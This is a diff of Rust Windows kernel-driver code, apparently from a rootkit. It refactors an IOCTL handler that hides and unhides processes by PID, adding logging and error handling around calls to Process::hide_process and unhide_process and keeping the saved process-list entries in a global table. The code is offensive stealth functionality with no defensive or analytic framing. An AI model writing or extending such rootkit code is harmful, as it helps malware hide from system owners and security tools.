@@ -111,39 +111,70 @@ impl IoctlManager {
         }));
 
         // Hide or Unhide the specified process.
-        self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+        self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
-                // Retrieves the process information from the input buffer.
+                // Retrieve process information from the input buffer.
                 let target_process = get_input_buffer::<TargetProcess>(stack)?;
                 let pid = (*target_process).pid;
-                
-                // Hide or unhide the process based on the 'enable' flag.
-                let status = if (*target_process).enable {
-                    // Hides the process and stores its previous state.
-                    let previous_list = Process::hide_process(pid)?;
-                    let mut process_info = PROCESS_INFO_HIDE.lock();
-                    let list_ptr = Box::into_raw(Box::new(previous_list));
-
-                    process_info.push(TargetProcess {
-                        pid,
-                        list_entry: AtomicPtr::new(list_ptr.cast()),
-                        ..Default::default()
-                    });
-
-                    STATUS_SUCCESS
+                let enable = (*target_process).enable;
+        
+                // Log the receipt of the request.
+                log::info!("HIDE/UNHIDE PROCESS handler invoked for PID: {} with enable flag: {}", pid, enable);
+        
+                let status = if enable {
+                    // Log the attempt to hide the process.
+                    log::info!("Attempting to hide process with PID: {}", pid);
+                    
+                    // Hide the process and log the previous state.
+                    match Process::hide_process(pid) {
+                        Ok(previous_list) => {
+                            log::debug!("Process {} hidden. Previous state: {:?}", pid, previous_list);
+                            let mut process_info = PROCESS_INFO_HIDE.lock();
+                            let list_ptr = Box::into_raw(Box::new(previous_list));
+                            process_info.push(TargetProcess {
+                                pid,
+                                list_entry: AtomicPtr::new(list_ptr.cast()),
+                                ..Default::default()
+                            });
+                            STATUS_SUCCESS
+                        },
+                        Err(e) => {
+                            log::error!("Failed to hide process with PID: {}. Error: {:?}", pid, e);
+                            // Return an appropriate NTSTATUS conversion from the error.
+                            e.to_ntstatus()
+                        }
+                    }
                 } else {
-                    // Unhides the process.
-                    let list_entry = PROCESS_INFO_HIDE.lock()
+                    // Log the attempt to unhide the process.
+                    log::info!("Attempting to unhide process with PID: {}", pid);
+                    let list_entry_result = PROCESS_INFO_HIDE.lock()
                         .iter()
                         .find(|p| p.pid == pid)
-                        .map(|process| process.list_entry.load(Ordering::SeqCst))
-                        .ok_or(ShadowError::ProcessNotFound(pid.to_string()))?;
-
-                    Process::unhide_process(pid, list_entry.cast())?
+                        .map(|process| process.list_entry.load(Ordering::SeqCst));
+                    
+                    match list_entry_result {
+                        Some(list_entry) => {
+                            match Process::unhide_process(pid, list_entry.cast()) {
+                                Ok(nt_status) => {
+                                    log::debug!("Process {} unhidden successfully", pid);
+                                    nt_status
+                                },
+                                Err(e) => {
+                                    log::error!("Failed to unhide process with PID: {}. Error: {:?}", pid, e);
+                                    e.to_ntstatus()
+                                }
+                            }
+                        },
+                        None => {
+                            log::error!("Process not found in hidden list for PID: {}", pid);
+                            return Err(ShadowError::ProcessNotFound(pid.to_string()).into());
+                        }
+                    }
                 };
-
-                // Updates the IoStatus and returns the result of the operation.
-                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
+        
+                // Log final status and update IoStatus.
+                log::info!("HIDE/UNHIDE PROCESS handler completed for PID: {} with status: {}", pid, status);
+                (*irp).IoStatus.Information = core::mem::size_of::<TargetProcess>() as u64;
                 Ok(status)
             }
         }));
